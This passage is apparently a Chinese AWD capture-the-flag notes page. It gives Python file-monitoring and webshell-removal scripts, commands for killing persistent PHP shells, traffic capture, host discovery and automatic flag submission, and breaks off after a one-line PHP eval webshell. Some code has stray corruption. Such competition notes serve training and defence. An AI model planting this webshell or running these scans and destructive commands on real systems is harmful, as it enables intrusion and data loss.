class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br><span class=line>26</span><br><span class=line>27</span><br><span class=line>28</span><br><span class=line>29</span><br><span class=line>30</span><br><span class=line>31</span><br><span class=line>32</span><br><span class=line>33</span><br><span class=line>34</span><br><span class=line>35</span><br><span class=line>36</span><br><span class=line>37</span><br><span class=line>38</span><br><span class=line>39</span><br><span class=line>40</span><br><span class=line>41</span><br><span class=line>42</span><br><span class=line>43</span><br><span class=line>44</span><br><span class=line>45</span><br><span class=line>46</span><br><span class=line>47</span><br><span class=line>48</span><br><span class=line>49</span><br><span class=line>50</span><br><span class=line>51</span><br><span class=line>52</span><br><span class=line>53</span><br><span class=line>54</span><br><span class=line>55</span><br><span class=line>56</span><br><span class=line>57</span><br><span class=line>58</span><br><span class=line>59</span><br><span class=line>60</span><br><span class=line>61</span><br><span class=line>62</span><br><span class=line>63</span><br><span class=line>64</span><br><span class=line>65</span><br><span class=line>66</span><br><span class=line>67</span><br><span class=line>68</span><br><span class=line>69</span><br><span class=line>70</span><br><span class=line>71</span><br><span class=line>72</span><br><span class=line>73</span><br><span class=line>74</span><br><span class=line>75</span><br><span class=line>76</span><br><span class=line>77</span><br><span class=line>78</span><br><span class=line>79</span><br><span class=line>80</span><br><span class=line>81</span><br><span class=line>82</span><br><span class=line>83</span><br><span class=line>84</span><br><span class=line>85</span><br><span class=line>86</span><br><span class=line>87</span><br><span class=line>88</span><br><span class=line>89</span><br><span class=line>90</span><br><span class=line>91</span><br><span class=line>92</span><br><span class=line>93</span><br><span class=line>94</span><br><span class=line>95</span><br><span class=line>96</span><br><span class=line>97</span><br><span class=line>98</span><br><span class=line>99</span><br><span class=line>100</span><br><span class=line>101</span><br><span class=line>102</span><br><span class=line>103</span><br><span class=line>104</span><br><span class=line>105</span><br><span class=line>106</span><br><span class=line>107</span><br><span class=line>108</span><br><span class=line>109</span><br><span class=line>110</span><br><span class=line>111</span><br><span class=line>112</span><br><span class=line>113</span><br><span class=line>114</span><br><span class=line>115</span><br><span class=line>116</span><br><span class=line>117</span><br><span class=line>118</span><br><span class=line>119</span><br><span class=line>120</span><br><span class=line>121</span><br><span class=line>122</span><br><span class=line>123</span><br><span class=line>124</span><br><span class=line>125</span><br><span class=line>126</span><br><span class=line>127</span><br><span class=line>128</span><br><span class=line>129</span><br><span class=line>130</span><br><span class=line>131</span><br><span class=line>132</span><br><span class=line>133</span><br><span class=line>134</span><br><span class=line>135</span><br><span class=line>136</span><br><span class=line>137</span><br><span class=line>138</span><br><span class=line>139</span><br><span class=line>140</span><br><span class=line>141</span><br><span class=line>142</span><br><span class=line>143</span><br><span class=line>144</span><br><span class=line>145</span><br><span class=line>146</span><br><span class=line>147</span><br><span class=line>148</span><br><span class=line>149</span><br><span class=line>150</span><br><span class=line>151</span><br><span class=line>152</span><br><span class=line>153</span><br><span class=line>154</span><br><span class=line>155</span><br><span class=line>156</span><br><span class=line>157</span><br><span class=line>158</span><br><span class=line>159</span><br><span class=line>160</span><br><span class=line>161</span><br><span class=line>162</span><br><span class=line>163</span><br><span class=line>164</span><br><span class=line>165</span><br><span class=line>166</span><br><span class=line>167</span><br><span class=line>168</span><br><span class=line>169</span><br><span class=line>170</span><br><span class=line>171</span><br><span class=line>172</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-comment># -*- coding: utf-8 -*-</span><br><span class=hljs-comment>#use: python file_check.py ./</span><br><br><span class=hljs-keyword>import</span> os<br><span class=hljs-keyword>import</span> hashlib<br><span class=hljs-keyword>import</span> shutil<br><span class=hljs-keyword>import</span> ntpath<br><span class=hljs-keyword>import</span> time<br><br>CWD = os.getcwd()<br>FILE_MD5_DICT = &#123;&#125; <span class=hljs-comment># 文件MD5字典</span><br>ORIGIN_FILE_LIST = []<br><br><span class=hljs-comment># 特殊文件路径字符串</span><br>Special_path_str = <span class=hljs-string>&#x27;drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82&#x27;</span><br>bakstring = <span class=hljs-string>&#x27;bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS&#x27;</span><br>logstring = <span class=hljs-string>&#x27;log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>webshellstring = <span class=hljs-string>&#x27;webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD&#x27;</span><br>difffile = <span class=hljs-string>&#x27;diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN&#x27;</span><br><br>Special_string = <span class=hljs-string>&#x27;drops_log&#x27;</span> <span class=hljs-comment># 免死金牌</span><br>UNICODE_ENCODING = <span class=hljs-string>&quot;utf-8&quot;</span><br>INVALID_UNICODE_CHAR_FORMAT = <span class=hljs-string>r&quot;\?%02x&quot;</span><br><br><span class=hljs-comment># 文件路径字典</span><br>spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))<br>Special_path = &#123;<br>    <span class=hljs-string>&#x27;bak&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, bakstring)),<br>    <span class=hljs-string>&#x27;log&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, logstring)),<br>    <span class=hljs-string>&#x27;webshell&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, webshellstring)),<br>    <span class=hljs-string>&#x27;difffile&#x27;</span> : os.path.realpath(os.path.join(spec_base_path, difffile)),<br>&#125;<br><br><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">isListLike</span>(<span class=hljs-params>value</span>):<br>    <span class=hljs-keyword>return</span> <span class=hljs-built_in>isinstance</span>(value, (<span class=hljs-built_in>list</span>, <span class=hljs-built_in>tuple</span>, <span class=hljs-built_in>set</span>))<br><br><span class=hljs-comment># 获取Unicode编码</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">getUnicode</span>(<span class=hljs-params>value, encoding=<span class=hljs-literal>None</span>, noneToNull=<span class=hljs-literal>False</span></span>):<br>    <span class=hljs-keyword>if</span> noneToNull <span class=hljs-keyword>and</span> value <span class=hljs-keyword>is</span> <span class=hljs-literal>None</span>:<br>        <span class=hljs-keyword>return</span> NULL<br>    <span class=hljs-keyword>if</span> isListLike(value):<br>        value = <span class=hljs-built_in>list</span>(getUnicode(_, encoding, noneToNull) <span class=hljs-keyword>for</span> _ <span class=hljs-keyword>in</span> value)<br>        <span class=hljs-keyword>return</span> value<br>    <span class=hljs-keyword>if</span> <span class=hljs-built_in>isinstance</span>(value, unicode):<br>        <span class=hljs-keyword>return</span> value<br>    <span class=hljs-keyword>elif</span> <span class=hljs-built_in>isinstance</span>(value, basestring):<br>        <span class=hljs-keyword>while</span> <span class=hljs-literal>True</span>:<br>            <span class=hljs-keyword>try</span>:<br>                <span class=hljs-keyword>return</span> unicode(value, encoding <span class=hljs-keyword>or</span> UNICODE_ENCODING)<br>            <span class=hljs-keyword>except</span> UnicodeDecodeError, ex:<br>                <span class=hljs-keyword>try</span>:<br>                    <span class=hljs-keyword>return</span> unicode(value, UNICODE_ENCODING)<br>                <span class=hljs-keyword>except</span>:<br>                    value = value[:ex.start] + <span class=hljs-string>&quot;&quot;</span>.join(INVALID_UNICODE_CHAR_FORMAT % <span class=hljs-built_in>ord</span>(_) <span class=hljs-keyword>for</span> _ <span class=hljs-keyword>in</span> value[ex.start:ex.end]) + value[ex.end:]<br>    <span class=hljs-keyword>else</span>:<br>        <span class=hljs-keyword>try</span>:<br>            <span class=hljs-keyword>return</span> unicode(value)<br>        <span class=hljs-keyword>except</span> UnicodeDecodeError:<br>            <span class=hljs-keyword>return</span> unicode(<span class=hljs-built_in>str</span>(value), errors=<span class=hljs-string>&quot;ignore&quot;</span>)<br><br><span class=hljs-comment># 目录创建</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">mkdir_p</span>(<span class=hljs-params>path</span>):<br>    <span class=hljs-keyword>import</span> errno<br>    <span class=hljs-keyword>try</span>:<br>        os.makedirs(path)<br>    <span class=hljs-keyword>except</span> OSError <span class=hljs-keyword>as</span> exc:<br>        <span class=hljs-keyword>if</span> exc.errno == errno.EEXIST <span class=hljs-keyword>and</span> os.path.isdir(path):<br>            passcur<br>        <span class=hljs-keyword>else</span>: <span class=hljs-keyword>raise</span><br><br><span class=hljs-comment># 获取当前所有文件路径</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">getfilelist</span>(<span class=hljs-params>cwd</span>):<br>    filelist = []<br>    <span class=hljs-keyword>for</span> root,subdirs, files <span class=hljs-keyword>in</span> os.walk(cwd):<br>        <span class=hljs-keyword>for</span> filepath <span class=hljs-keyword>in</span> files:cur<br>            originalfile = os.path.join(root, filepath)<br>            <span class=hljs-keyword>if</span> Special_path_str <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> originalfile:<br>                filelist.append(originalfile)<br>    <span class=hljs-keyword>return</span> filelist<br><br><span class=hljs-comment># 计算机文件MD5值</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">calcMD5</span>(<span class=hljs-params>filepath</span>):<br>    <span class=hljs-keyword>try</span>:<br>        <span class=hljs-keyword>with</span> <span class=hljs-built_in>open</span>(filepath,<span class=hljs-string>&#x27;rb&#x27;</span>) <span class=hljs-keyword>as</span> f:<br>            md5obj = hashlib.md5()<br>            md5obj.update(f.read())<br>            <span class=hljs-built_in>hash</span> = md5obj.hexdigest()<br>            <span class=hljs-keyword>return</span> <span class=hljs-built_in>hash</span><br>    <span class=hljs-keyword>except</span> Exception, e:<br>        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[!] getmd5_error : &#x27;</span> + getUnicode(filepath)<br>        <span class=hljs-built_in>print</span> getUnicode(e)<br>        <span class=hljs-keyword>try</span>:<br>            ORIGIN_FILE_LIST.remove(filepath)<br>            FILE_MD5_DICT.pop(filepath, <span class=hljs-literal>None</span>)<br>        <span class=hljs-keyword>except</span> KeyError, e:<br>            <span class=hljs-keyword>pass</span><br><br><span class=hljs-comment># 获取所有文件MD5</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">getfilemd5dict</span>(<span class=hljs-params>filelist = []</span>):<br>    filemd5dict = &#123;&#125;<br>    <span class=hljs-keyword>for</span> ori_file <span class=hljs-keyword>in</span> filelist:<br>        <span class=hljs-keyword>if</span> Special_path_str <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> ori_file:<br>            md5 = calcMD5(os.path.realpath(ori_file))<br>            <span class=hljs-keyword>if</span> md5:<br>                filemd5dict[ori_file] = md5<br>    <span class=hljs-keyword>return</span> filemd5dict<br><br><span class=hljs-comment># 备份所有文件</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">backup_file</span>(<span class=hljs-params>filelist=[]</span>):<br>    <span class=hljs-comment># if len(os.listdir(Special_path[&#x27;bak&#x27;])) == 0:</span><br>    <span class=hljs-keyword>for</span> filepath <span class=hljs-keyword>in</span> filelist:<br>        <span class=hljs-keyword>if</span> Special_path_str <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> filepath:<br>            shutil.copy2(filepath, Special_path[<span class=hljs-string>&#x27;bak&#x27;</span>])<br><br><span class=hljs-keyword>if</span> __name__ == <span class=hljs-string>&#x27;__main__&#x27;</span>:<br>    <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;---------start------------&#x27;</span><br>    <span class=hljs-keyword>for</span> value <span class=hljs-keyword>in</span> Special_path:<br>        mkdir_p(Special_path[value])<br>    <span class=hljs-comment># 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件</span><br>    ORIGIN_FILE_LIST = getfilelist(CWD)<br>    FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST)<br>    backup_file(ORIGIN_FILE_LIST) <span class=hljs-comment># TODO 备份文件可能会产生重名BUG</span><br>    <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[*] pre work end!&#x27;</span><br>    <span class=hljs-keyword>while</span> <span class=hljs-literal>True</span>:<br>        file_list = getfilelist(CWD)<br>        <span class=hljs-comment># 移除新上传文件</span><br>        diff_file_list = <span class=hljs-built_in>list</span>(<span class=hljs-built_in>set</span>(file_list) ^ <span class=hljs-built_in>set</span>(ORIGIN_FILE_LIST))<br>        <span class=hljs-keyword>if</span> <span class=hljs-built_in>len</span>(diff_file_list) != <span class=hljs-number>0</span>:<br>            <span class=hljs-comment># import pdb;pdb.set_trace()</span><br>            <span class=hljs-keyword>for</span> filepath <span class=hljs-keyword>in</span> diff_file_list:<br>                <span class=hljs-keyword>try</span>:<br>                    f = <span class=hljs-built_in>open</span>(filepath, <span class=hljs-string>&#x27;r&#x27;</span>).read()<br>                <span class=hljs-keyword>except</span> Exception, e:<br>                    <span class=hljs-keyword>break</span><br>                <span class=hljs-keyword>if</span> Special_string <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> f:<br>                    <span class=hljs-keyword>try</span>:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[*] webshell find : &#x27;</span> + getUnicode(filepath)<br>                        shutil.move(filepath, os.path.join(Special_path[<span class=hljs-string>&#x27;webshell&#x27;</span>], ntpath.basename(filepath) + <span class=hljs-string>&#x27;.txt&#x27;</span>))<br>                    <span class=hljs-keyword>except</span> Exception <span class=hljs-keyword>as</span> e:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filepath)<br>                    <span class=hljs-keyword>try</span>:<br>                        f = <span class=hljs-built_in>open</span>(os.path.join(Special_path[<span class=hljs-string>&#x27;log&#x27;</span>], <span class=hljs-string>&#x27;log.txt&#x27;</span>), <span class=hljs-string>&#x27;a&#x27;</span>)<br>                        f.write(<span class=hljs-string>&#x27;newfile: &#x27;</span> + getUnicode(filepath) + <span class=hljs-string>&#x27; : &#x27;</span> + <span class=hljs-built_in>str</span>(time.ctime()) + <span class=hljs-string>&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class=hljs-keyword>except</span> Exception <span class=hljs-keyword>as</span> e:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[-] log error : file move error: &#x27;</span> + getUnicode(e)<br><br>        <span class=hljs-comment># 防止任意文件被修改,还原被修改文件</span><br>        md5_dict = getfilemd5dict(ORIGIN_FILE_LIST)<br>        <span class=hljs-keyword>for</span> filekey <span class=hljs-keyword>in</span> md5_dict:<br>            <span class=hljs-keyword>if</span> md5_dict[filekey] != FILE_MD5_DICT[filekey]:<br>                <span class=hljs-keyword>try</span>:<br>                    f = <span class=hljs-built_in>open</span>(filekey, <span class=hljs-string>&#x27;r&#x27;</span>).read()<br>                <span class=hljs-keyword>except</span> Exception, e:<br>                    <span class=hljs-keyword>break</span><br>                <span class=hljs-keyword>if</span> Special_string <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> f:<br>                    <span class=hljs-keyword>try</span>:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[*] file had be change : &#x27;</span> + getUnicode(filekey)<br>                        shutil.move(filekey, os.path.join(Special_path[<span class=hljs-string>&#x27;difffile&#x27;</span>], ntpath.basename(filekey) + <span class=hljs-string>&#x27;.txt&#x27;</span>))<br>                        shutil.move(os.path.join(Special_path[<span class=hljs-string>&#x27;bak&#x27;</span>], ntpath.basename(filekey)), filekey)<br>                    <span class=hljs-keyword>except</span> Exception <span class=hljs-keyword>as</span> e:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[!] move webshell error, &quot;%s&quot; maybe is webshell.&#x27;</span>%getUnicode(filekey)<br>                    <span class=hljs-keyword>try</span>:<br>                        f = <span class=hljs-built_in>open</span>(os.path.join(Special_path[<span class=hljs-string>&#x27;log&#x27;</span>], <span class=hljs-string>&#x27;log.txt&#x27;</span>), <span class=hljs-string>&#x27;a&#x27;</span>)<br>                        f.write(<span class=hljs-string>&#x27;diff_file: &#x27;</span> + getUnicode(filekey) + <span class=hljs-string>&#x27; : &#x27;</span> + getUnicode(time.ctime()) + <span class=hljs-string>&#x27;\n&#x27;</span>)<br>                        f.close()<br>                    <span class=hljs-keyword>except</span> Exception <span class=hljs-keyword>as</span> e:<br>                        <span class=hljs-built_in>print</span> <span class=hljs-string>u&#x27;[-] log error : done_diff: &#x27;</span> + getUnicode(filekey)<br>                        <span class=hljs-keyword>pass</span><br>        time.sleep(<span class=hljs-number>2</span>)<br>        <span class=hljs-comment># print &#x27;[*] &#x27; + getUnicode(time.ctime())</span><br></code></pre></td></tr></table></figure><ul><li>Python 监控<strong>被修改</strong>的文件</li></ul><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br><span class=line>19</span><br><span class=line>20</span><br><span class=line>21</span><br><span class=line>22</span><br><span class=line>23</span><br><span class=line>24</span><br><span class=line>25</span><br><span class=line>26</span><br><span class=line>27</span><br><span class=line>28</span><br><span class=line>29</span><br><span class=line>30</span><br><span class=line>31</span><br><span class=line>32</span><br><span class=line>33</span><br><span class=line>34</span><br><span class=line>35</span><br><span class=line>36</span><br><span class=line>37</span><br><span class=line>38</span><br><span class=line>39</span><br><span class=line>40</span><br><span class=line>41</span><br><span class=line>42</span><br><span class=line>43</span><br><span class=line>44</span><br><span class=line>45</span><br><span class=line>46</span><br><span class=line>47</span><br><span class=line>48</span><br><span class=line>49</span><br><span class=line>50</span><br><span class=line>51</span><br><span class=line>52</span><br><span class=line>53</span><br><span class=line>54</span><br><span class=line>55</span><br><span class=line>56</span><br><span class=line>57</span><br><span class=line>58</span><br><span class=line>59</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-comment>#!/usr/bin/python</span><br><span class=hljs-comment>#coding=utf-8</span><br><span class=hljs-comment>#Usage ：python demo.py</span><br><span class=hljs-comment>#Code by : AdminTony</span><br><span class=hljs-comment>#QQ : 78941695</span><br><span class=hljs-comment>#注意：要将此文件放在有读写权限的目录以及所有修改过的php必须在此目录或者该目录的子目录中。</span><br><span class=hljs-comment>#作用：读取被修改过的文件，然后将文件的地址加上内容全部存放在txt</span><br><br><br><span class=hljs-keyword>import</span> sys,subprocess,os<br><span class=hljs-comment>#查找最近10分钟被修改的文件</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">scanfile</span>():<br> <span class=hljs-comment>#command: find -name &#x27;*.php&#x27; -mmin -10</span><br> command = <span class=hljs-string>&quot;find -name \&#x27;*.php\&#x27; -mmin -10&quot;</span><br> su = subprocess.Popen(command,shell=<span class=hljs-literal>True</span>,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)<br> STDOUT,STDERR = su.communicate()<br> <span class=hljs-built_in>list</span> = STDOUT.split(<span class=hljs-string>&quot;\n&quot;</span>)<br> <span class=hljs-comment>#print str(list)</span><br> <span class=hljs-comment>#将文件处理成list类型然后返回。</span><br> <span class=hljs-keyword>return</span> <span class=hljs-built_in>list</span><br><br><span class=hljs-comment>#读取文件：</span><br><span class=hljs-keyword>def</span> <span class="hljs-title function_">loadfile</span>(<span class=hljs-params>addr</span>):<br> data = <span class=hljs-string>&quot;&quot;</span><br> <span class=hljs-comment>#如果文件不存在就跳出函数</span><br> <span class=hljs-keyword>try</span> :<br>  file = <span class=hljs-built_in>open</span>(addr,<span class=hljs-string>&#x27;r&#x27;</span>)<br>  data = file.read()<br> <span class=hljs-keyword>except</span> : <br>  <span class=hljs-keyword>return</span> <span class=hljs-number>0</span><br> all_data = addr+<span class=hljs-string>&quot;\n&quot;</span>+data+<span class=hljs-string>&quot;\n\n&quot;</span><br> file1 = <span class=hljs-built_in>open</span>(<span class=hljs-string>&quot;shell.txt&quot;</span>,<span class=hljs-string>&#x27;a+&#x27;</span>)<br> <span class=hljs-comment>#避免重复写入</span><br> <span class=hljs-keyword>try</span>:<br>  shell_content = file1.read()<br> <span class=hljs-keyword>except</span>:<br>  shell_content = <span class=hljs-string>&quot;null&quot;</span><br> <span class=hljs-comment>#如果文件内容不为空再写入，避免写入空的。</span><br> <span class=hljs-comment>#print shell_content</span><br> <span class=hljs-keyword>if</span> data :<br>  <span class=hljs-keyword>if</span> all_data <span class=hljs-keyword>not</span> <span class=hljs-keyword>in</span> shell_content:<br>   file1.write(all_data)<br> file.close()<br> file1.close()<br> rm_cmd = <span class=hljs-string>&quot;rm -rf &quot;</span>+addr<br> su = subprocess.Popen(rm_cmd,shell=<span class=hljs-literal>True</span>,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)<br> su.communicate()<br> <span class=hljs-built_in>print</span> <span class=hljs-string>&quot;loadfile over : &quot;</span>+addr<br><br><span class=hljs-keyword>if</span> __name__ == <span class=hljs-string>&#x27;__main__&#x27;</span>:<br> <span class=hljs-keyword>while</span> <span class=hljs-literal>True</span>:<br><br>  <span class=hljs-built_in>list</span> = scanfile()<br>  <span class=hljs-keyword>if</span> <span class=hljs-built_in>list</span> :<br>   <span class=hljs-keyword>for</span> i <span class=hljs-keyword>in</span> <span class=hljs-built_in>range</span>(<span class=hljs-built_in>len</span>(<span class=hljs-built_in>list</span>)):<br>    <span class=hljs-comment>#如果list[i]为空就不读取了</span><br>    <span class=hljs-keyword>if</span> <span class=hljs-built_in>list</span>[i]:<br>     loadfile(<span class=hljs-built_in>str</span>(<span class=hljs-built_in>list</span>[i]))<br>  <span class=hljs-keyword>else</span> : <span class=hljs-keyword>pass</span><br></code></pre></td></tr></table></figure><h3 id=删除不死马><a class=markdownIt-Anchor href=#删除不死马></a> 删除不死马</h3><ol><li><p><code>ps auxww|grep shell.php</code> 找到pid后杀掉进程</p><ul><li><p>循环杀进程</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">ps aux|grep www-data|awk <span class=hljs-string>&#x27;&#123;print $2&#125;&#x27;</span>|xargs <span class=hljs-built_in>kill</span> <br></code></pre></td></tr></table></figure></li></ul></li><li><p>重启php等web服务</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs bash">service php-fpm restart<br></code></pre></td></tr></table></figure></li><li><p>用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。</p><ul><li><p>usleep要低于对方不死马设置的值</p></li><li><p>3.php</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span><br>    <span class="hljs-title function_ invoke__">ignore_user_abort</span>(<span class=hljs-literal>true</span>);<br>    <span class="hljs-title function_ invoke__">set_time_limit</span>(<span class=hljs-number>0</span>);<br>    <span class="hljs-title function_ invoke__">unlink</span>(<span class=hljs-keyword>__FILE__</span>);<br>    <span class=hljs-variable>$file</span> = <span class=hljs-string>&#x27;.3.php&#x27;</span>;<br>    <span class=hljs-variable>$code</span> = <span class=hljs-string>&#x27;hi springbird !&#x27;</span>;<br>    <span class=hljs-comment>//pass=pass</span><br>    <span class=hljs-keyword>while</span> (<span class=hljs-number>1</span>)&#123;<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class=hljs-variable>$file</span>,<span class=hljs-variable>$code</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class=hljs-string>&#x27;touch -m -d &quot;2018-12-01 09:10:12&quot; .3.php&#x27;</span>);<br>    <span class=hljs-comment>//    usleep(5000);</span><br>          <span class="hljs-title function_ invoke__">usleep</span>(<span class=hljs-number>1000</span>);<br>    &#125;<br><span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>创建一个和不死马<strong>生成的马</strong>一样名字的文件夹 <code>mkdir 1.php</code></p><ul><li><p>循环创建</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-meta>#!/bin/bash</span><br>dire=<span class=hljs-string>&quot;/var/www/html/.base.php/&quot;</span><br>file=<span class=hljs-string>&quot;/var/www/html/.base.php&quot;</span><br><span class=hljs-built_in>rm</span> -rf <span class=hljs-variable>$file</span><br><span class=hljs-built_in>mkdir</span> <span class=hljs-variable>$dire</span><br>./xx.sh<br></code></pre></td></tr></table></figure></li></ul></li></ol><h3 id=流量分析><a class=markdownIt-Anchor href=#流量分析></a> 流量分析</h3><ul><li><p>在比赛服务器上抓取流量包</p><figure class="highlight bash"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br></pre></td><td class=code><pre><code class="hljs bash"><span class=hljs-built_in>sudo</span> tcpdump -s 0 -w flow.pcap port 80<br><span class=hljs-comment># 然后使用 scp 写个脚本实时将流量包拷贝到本地</span><br></code></pre></td></tr></table></figure></li><li><p>抓取流量平台 <a target=_blank rel=noopener href=https://github.com/wupco>wupco</a>/<strong><a target=_blank rel=noopener href=https://github.com/wupco/weblogger>weblogger</a></strong></p></li><li><p>流量分析平台 <a target=_blank rel=noopener href=https://github.com/seadog007>seadog007</a>/<strong><a target=_blank rel=noopener href=https://github.com/seadog007/pcap-search>pcap-search</a></strong></p></li></ul><h3 id=日志分析><a class=markdownIt-Anchor href=#日志分析></a> 日志分析</h3><ul><li><a target=_blank rel=noopener href=https://security.tencent.com/index.php/opensource/detail/15>LogForensics 腾讯实验室 /web日志取证分析工具</a></li><li>日志地址<ul><li>/var/log/apache2/</li><li>/usr/local/apache2/logs</li><li>/usr/nginx/logs/</li></ul></li></ul><h2 id=攻击><a class=markdownIt-Anchor href=#攻击></a> 攻击</h2><h3 id=主机发现><a class=markdownIt-Anchor href=#主机发现></a> 主机发现</h3><ul><li>nmap、Routescan</li><li>Python 脚本</li></ul><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-keyword>for</span> x <span class=hljs-keyword>in</span> <span class=hljs-built_in>range</span>(<span class=hljs-number>2</span>,<span class=hljs-number>255</span>): <br>    url = <span class=hljs-string>&quot;http://192.168.1.&#123;&#125;&quot;</span>.<span class=hljs-built_in>format</span>(x) <br>    <span class=hljs-keyword>try</span>: <br>        r = requests.post(url) <br>        <span class=hljs-built_in>print</span>(url) <br>    <span class=hljs-keyword>except</span>: <br>        <span class=hljs-keyword>pass</span><br></code></pre></td></tr></table></figure><h3 id=自动提交flag><a class=markdownIt-Anchor href=#自动提交flag></a> 自动提交flag</h3><ul><li><p>以i春秋的API接口为例</p><figure class="highlight python"><table><tr><td class=gutter><pre><span class=line>1</span><br><span class=line>2</span><br><span class=line>3</span><br><span class=line>4</span><br><span class=line>5</span><br><span class=line>6</span><br><span class=line>7</span><br><span class=line>8</span><br><span class=line>9</span><br><span class=line>10</span><br><span class=line>11</span><br><span class=line>12</span><br><span class=line>13</span><br><span class=line>14</span><br><span class=line>15</span><br><span class=line>16</span><br><span class=line>17</span><br><span class=line>18</span><br></pre></td><td class=code><pre><code class="hljs python"><span class=hljs-keyword>import</span> requests<br><span class=hljs-keyword>import</span> sys<br>reload(sys)<br>sys.setdefaultencoding(utf-<span class=hljs-number>8</span>)<br><span class=hljs-keyword>def</span> <span class="hljs-title function_">post_answer</span>(<span class=hljs-params>flag</span>):<br>    url=<span class=hljs-string>&#x27;http://172.16.4.1/Common/submitAnswer&#x27;</span> <br>    header = &#123;<br>        <span class=hljs-string>&#x27;Content-type&#x27;</span>: <span class=hljs-string>r&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,<br>        <span class=hljs-string>&#x27;X-Requested-With&#x27;</span>: <span class=hljs-string>&#x27;XMLHttoRequest&#x27;</span>,<br>        <span class=hljs-string>&#x27;User-Agent&#x27;</span>: <span class=hljs-string>r&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; re:45.0) Gecko/20100101 Firefox/45.0&#x27;</span>,<br>        <span class=hljs-string>&#x27;Referer&#x27;</span>: <span class=hljs-string>&#x27;http://172.16.4.102/answer/index&#x27;</span><br>    &#125;<br>    post_data=&#123;<br>        <span class=hljs-string>&#x27;answer&#x27;</span>: flag.<br>        <span class=hljs-string>&#x27;token&#x27;</span>: <span class=hljs-string>&#x27;d16ba10b829f4cfae33de641b071ea8a&#x27;</span><br>    &#125;<br>    re=requests.post(url=url,data=post_data,headers=headers)<br>    <span class=hljs-keyword>return</span> re<br></code></pre></td></tr></table></figure></li></ul><h3 id=木马><a class=markdownIt-Anchor href=#木马></a> 木马</h3><ul><li><p>一句话木马</p><figure class="highlight php"><table><tr><td class=gutter><pre><span class=line>1</span><br></pre></td><td class=code><pre><code class="hljs php"><span class=hljs-meta>&lt;?php</span> @<span class=hljs-keyword>eval</span>(<span class=hljs-variable>$_POST</span>[<span class=hljs-string>&#x27;attack&#x27;</span>]);<span class=hljs-meta>?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>MD5木马</p><figure class="highlight php"><table><tr><td class=gutter><pre><span 